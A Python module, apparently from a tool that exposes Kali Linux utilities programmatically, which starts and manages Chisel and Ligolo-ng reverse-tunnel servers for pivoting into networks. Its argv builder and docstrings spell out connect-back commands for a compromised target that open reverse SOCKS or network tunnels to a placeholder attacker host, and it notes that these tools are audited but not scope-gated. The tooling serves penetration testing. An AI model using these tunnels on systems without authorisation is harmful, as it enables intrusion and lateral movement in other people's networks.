# SPDX-License-Identifier: Apache-2.0
# Copyright 2026 Aaron K. Clark
"""Reverse-tunnel pivoting (Chisel / Ligolo-ng).

Both tools run a **long-running listener/server on the Kali side** that a
client/agent on the compromised target connects *back* to — so they follow
the persistent-process model (a background drain thread over a live
subprocess) rather than the one-shot :func:`kalimcp.run.run` path:

* **Chisel** — ``chisel server --reverse`` listens on a port; the operator
  then runs the chisel *client* on the target (``chisel client
  <LHOST>:<port> R:socks``) to tunnel a reverse SOCKS proxy back through us.
  It is not interactive: status (new tunnels) just lands on stdout.
* **Ligolo-ng** — ``ligolo-proxy`` listens for an agent connection and drops
  you into an **interactive console** where you select a session and ``start``
  the tunnel. :func:`pivot_send` feeds that console commands (``session``,
  ``start``, ``ifconfig``, …); the operator runs ``ligolo-agent -connect
  <LHOST>:<port> -ignore-cert`` on the target.

Per the no-authorization-gate rule these are **audited, not scope-gated**.
The persistent-process layer is isolated behind this module's own
:func:`_popen` factory (a private copy of the sessions.py / capture.py
pattern, so the modules never share mutable state) — the test suite patches
it to exercise the registry without spawning anything real.
"""

from __future__ import annotations

import shlex
import subprocess
import threading
import time
import uuid
from typing import Any

from .. import audit, run

# pivot_id -> {"id", "tool", "port", "argv", "started_at", "proc": _PersistentProc}
_pivots: dict[str, dict[str, Any]] = {}

_TOOLS = ("chisel", "ligolo")

_DEFAULT_PORTS = {"chisel": 8080, "ligolo": 11601}


def _new_id() -> str:
    return f"piv-{uuid.uuid4().hex[:8]}"


def _audit(action: str, **fields: Any) -> None:
    audit.log("pivot_invoke", action=action, **fields)


def _now() -> str:
    from datetime import UTC, datetime
    return datetime.now(UTC).isoformat(timespec="seconds")


# ---------- persistent process (private copy of the capture.py pattern) ----------

def _popen(argv: list[str]) -> Any:
    """Spawn a persistent server with duplex pipes. Patched in tests."""
    return subprocess.Popen(  # noqa: S603 (list argv, no shell)
        argv,
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        bufsize=0,
        start_new_session=True,
    )


class _PersistentProc:
    """Wraps a long-lived server: a background thread drains stdout into a
    buffer; ``send`` writes to stdin (Ligolo's console); ``read_new`` returns
    + clears the buffer; ``alive`` / ``stop`` manage the lifecycle. A private
    copy of the capture.py class so the modules don't share mutable state."""

    def __init__(self, argv: list[str]) -> None:
        self._proc = _popen(argv)
        self._buf = bytearray()
        self._lock = threading.Lock()
        self._reader = threading.Thread(target=self._drain, daemon=True)
        self._reader.start()

    def _drain(self) -> None:
        stream = self._proc.stdout
        if stream is None:
            return
        try:
            while True:
                chunk = stream.read(4096)
                if not chunk:
                    break
                with self._lock:
                    if len(self._buf) < run.MAX_OUTPUT_BYTES:
                        self._buf += chunk
        except (ValueError, OSError):
            pass

    def send(self, data: bytes) -> None:
        if self._proc.stdin is not None:
            self._proc.stdin.write(data)
            try:
                self._proc.stdin.flush()
            except (BrokenPipeError, OSError):
                pass

    def read_new(self) -> bytes:
        with self._lock:
            out = bytes(self._buf)
            self._buf.clear()
        return out

    def alive(self) -> bool:
        return self._proc.poll() is None

    def stop(self) -> None:
        try:
            self._proc.terminate()
        except (ProcessLookupError, OSError):
            pass


# ---------- argv builders ----------

def _build_argv(tool: str, *, port: int, extra: str) -> tuple[list[str], str]:
    """Return (argv, operator_hint) for a pivot tool.

    ``operator_hint`` is the command the operator runs ON THE TARGET to
    connect back; ``<LHOST>`` is a literal placeholder for our address.
    """
    if tool == "chisel":
        argv = ["chisel", "server", "-p", str(port), "--reverse"]
        hint = f"chisel client <LHOST>:{port} R:socks"
    else:  # ligolo
        argv = ["ligolo-proxy", "-selfcert", "-laddr", f"0.0.0.0:{port}"]
        hint = f"ligolo-agent -connect <LHOST>:{port} -ignore-cert"
    if extra.strip():
        argv += shlex.split(extra)
    return argv, hint


# ---------- public API ----------

async def pivot_start(
    *,
    tool: str = "chisel",
    port: int = 0,
    extra: str = "",
    wait_seconds: int = 2,
) -> dict[str, Any]:
    """Start a reverse-tunnel listener/server; returns its pivot id.

    The server runs in the background; this call waits ``wait_seconds`` to
    collect the startup banner, then returns. The ``operator_hint`` is the
    command to run ON THE TARGET to connect back. For Ligolo, drive the
    interactive console with :func:`pivot_send`; poll new output (tunnel
    connections / status) with :func:`pivot_poll`.
    """
    if tool not in _TOOLS:
        return run.error_result(f"tool must be one of {_TOOLS}, got {tool!r}")

    p = int(port) or _DEFAULT_PORTS[tool]
    argv, hint = _build_argv(tool, port=p, extra=extra)

    try:
        proc = _PersistentProc(argv)
    except (OSError, ValueError) as exc:
        _audit("pivot_start_failed", tool=tool, argv=argv, error=str(exc))
        return {"ok": False, "error": "pivot_failed", "message": str(exc)}

    pid = _new_id()
    _pivots[pid] = {
        "id": pid,
        "tool": tool,
        "port": p,
        "argv": argv,
        "started_at": _now(),
        "proc": proc,
    }
    _audit("pivot_start", pivot_id=pid, tool=tool, port=p, argv=argv)

    time.sleep(max(0, min(int(wait_seconds), 60)))
    initial = proc.read_new().decode("utf-8", errors="replace")
    return {
        "ok": True,
        "pivot_id": pid,
        "tool": tool,
        "port": p,
        "initial_output": initial,
        "operator_hint": hint,
    }


def pivot_send(pivot_id: str, command: str) -> dict[str, Any]:
    """Feed a console command to a pivot and return its new output.

    For Ligolo's interactive console this drives ``session`` / ``start`` /
    ``ifconfig`` / etc. For chisel (not interactive) it just drains output.
    """
    entry = _pivots.get(pivot_id)
    if not entry:
        return run.error_result(f"no such pivot: {pivot_id}")
    proc: _PersistentProc = entry["proc"]
    if command:
        proc.send(command.encode("utf-8", errors="replace") + b"\n")
        time.sleep(0.3)
    output = proc.read_new().decode("utf-8", errors="replace")
    _audit("pivot_send", pivot_id=pivot_id, tool=entry["tool"], alive=proc.alive())
    return {"ok": True, "pivot_id": pivot_id, "output": output, "alive": proc.alive()}


def pivot_poll(pivot_id: str) -> dict[str, Any]:
    """Drain new pivot output (new tunnel connections / status)."""
    entry = _pivots.get(pivot_id)
    if not entry:
        return run.error_result(f"no such pivot: {pivot_id}")
    proc: _PersistentProc = entry["proc"]
    output = proc.read_new().decode("utf-8", errors="replace")
    _audit("pivot_poll", pivot_id=pivot_id, tool=entry["tool"], alive=proc.alive())
    return {"ok": True, "pivot_id": pivot_id, "output": output, "alive": proc.alive()}


def pivot_stop(pivot_id: str) -> dict[str, Any]:
    """Terminate a pivot server and unregister it."""
    entry = _pivots.pop(pivot_id, None)
    if not entry:
        return {"ok": False, "error": "no_such_pivot", "pivot_id": pivot_id}
    entry["proc"].stop()
    _audit("pivot_stop", pivot_id=pivot_id, tool=entry["tool"])
    return {"ok": True, "pivot_id": pivot_id, "stopped": True}


def pivot_list() -> dict[str, Any]:
    """List active reverse-tunnel pivots."""
    items = []
    for pid, entry in sorted(_pivots.items()):
        items.append({
            "id": pid,
            "tool": entry["tool"],
            "port": entry["port"],
            "alive": bool(entry["proc"].alive()),
        })
    return {"pivots": items, "count": len(items)}


def reset_for_test() -> None:
    _pivots.clear()
